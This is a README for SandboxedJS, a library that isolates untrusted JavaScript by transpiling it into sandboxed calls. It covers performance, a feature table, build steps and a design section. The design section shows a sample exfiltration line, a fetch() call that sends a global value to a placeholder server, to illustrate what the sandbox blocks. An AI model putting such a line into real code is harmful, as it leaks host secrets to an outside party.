# SandboxedJS

Sandbox untrusted/arbitrary JavaScript code and safely execute it in isolation.

## Performance

Run `npm run benchmark` to benchmark SandboxedJS's `saveEval` against a native js `eval`. Currently most benchmarks comparisons show SandboxedJS is **~20x** slower than native JS. However, if you don't count the time required to transpile the code, execution time can be as low as **~1.3x** the speed of native JS, depending on the kind of work being performed. The goal for the MVP is to just get this thing working in a secure manner (breaking out of sandbox should be impossible), and optimizations can come later.

## Bindings to native and host JS APIs

One of the main focuses of this project is to support as many APIs as possible, both native ECMAScript APIs and host APIs (i.e. browser's `window` version of `globalThis`, DOM and such). To accomplish this, there is a separate node project under [bindings](https://github.com/joehinkle11/SandboxedJS/tree/main/bindings) which is responsible for taking in typescript definitions (i.e. a `lib.d.ts`) and then generating binding code for the sandbox environment. Recently all the hardcoded bindings were replaced with this system and all the old unit tests (15,000+) are passing. The hope is to get this binding generation system working so well that it's trivial to expose a JS library to the sandbox environment provided you have a typescript definition file for it.

## Status

Under active development. Looking for others to help out! 🙋‍♂️

## JS Support 

| Feature | Status |
| ------- | ------ |
| primitives | ✅ |
| `number` | ✅ |
| `string` | ✅ |
| `boolean` | ✅ |
| `null` | ✅ |
| `undefined` | ✅ |
| `bigint` | ✅ |
| `symbol` | ✅ |
| simple objects (i.e. `{a: true}`) | ✅ |
| weird numbers like `Infinity` or `NaN` | ✅ |
| autoboxing primitives to objects | ✅ |
| binary operators (`+`, `-`, `%`, etc.) | ✅ |
| unary operators  (`+`, `-`, `typeof`, etc.) | ✅ 
| arrays | ✅ |
| functions | ✅ |
| function constructors | ✅ |
| Function prototype for constructor call | ✅ |
| return | ✅ |
| `instanceof` | ✅ |
| `eval(...)` | ❌ |
| brainfuck-like code i.e. `+!![] / +![] // Infinity` | ✅ |
| function `bind` | ✅ |
| lambda/arrow functions | ⚠️ |
| `this` | ✅ |
| `arguments` | ✅ |
| global functions like `parseFloat` `parseInt` `isNaN` `isFinite` | ✅  |
| `unescape` `escape` | ✅ |
| function param names | ✅ |
| rest parameter | ✅ |
| spread operator | ❌ |
| throw | ✅ |
| try catch | ✅ |
| finally | ✅ |
| async | ❌ |
| await | ❌ |
| class | ❌ |
| getters/setters | ⚠️ |
| local variables | ✅ |
| assignment | ✅ |
| global variables | ⚠️ |
| prototypes | ✅ |
| `__proto__` on plain object init sets prototype | ✅ |
| `Object` global | ✅ |
| `Reflect` global | ⚠️ |
| `Proxy` global | ⚠️ |
| frozen / extensible object states | ⚠️ |
| enumerable / configurable object property states | ⚠️ |
| `delete` | ❌ |
| ternary operators | ✅ |
| destructuring | ❌ |
| imports | ❌ |


| Legend |  |
| ------- | ------ |
| ✅ | Finished  |
| ⚠️ | In development  |
| ❌ | Haven't started work  |

## Comparison of JS in JS Implementations

| Name | Link | Performance |
| ----------- | ----------- | --------- |
| SandboxedJS |  | ~20x slower than native |
| js.js | https://github.com/jterrace/js.js/ | [~200x slower than native]()https://github.com/jterrace/js.js/#status |
| JS-Interpreter | https://github.com/NeilFraser/JS-Interpreter/ | [~200x slower than native](https://github.com/NeilFraser/JS-Interpreter/issues/227) |


## Design

Let's say we want to sandbox the following untrusted JS code:

```js
fetch("https://api.example.com?stolenSecret=" + window.globalValue);
```

In this example, the untrusted code is attempting to grab a global value it should NOT have access to and pass the value to its server. If this code was naively run with `eval`, the host environment would be compromised.

To make untrusted JS code safe to run, SandboxedJS rewrites the untrusted code using a JS-to-JS transpilation step. Then it is safe to run `eval` on the transpiled js code. The resulting transpiled code of the above example might look something as follows:

```js
sContext.sLookUp("fetch").sCall([
  SBinaryOps.sBinaryAdd(
    new SStringValue("https://api.example.com?stolenSecret="),
    sContext.sLookUp("window").sLookUp("globalValue")
  )
])
```

Note, the "s" prefix is short for "sandboxed".

To produce this code, SandboxedJS uses [acorn](https://github.com/acornjs/acorn) to produce an AST of the untrusted JS. It then walks the entire AST and emits each piece of the tree in the format above.

## Running Locally

First you need to build the bindings.

Cd into bindings folder: `cd bindings`

Install deps: `npm i`

Build bindings: `npm run start`

You should now have src/gen/Bindings_Generated.ts present in your project.

Cd back to main folder: `cd ..`

Install deps: `npm i`

Run tests: `npm test`

Run benchmarks: `npm run benchmark`

Build to `lib` folder: `npm run build`

## Unique Features

 - Add metadata to any JS value which is invisible to the client (untrusted) JS code but visible to the host environment.
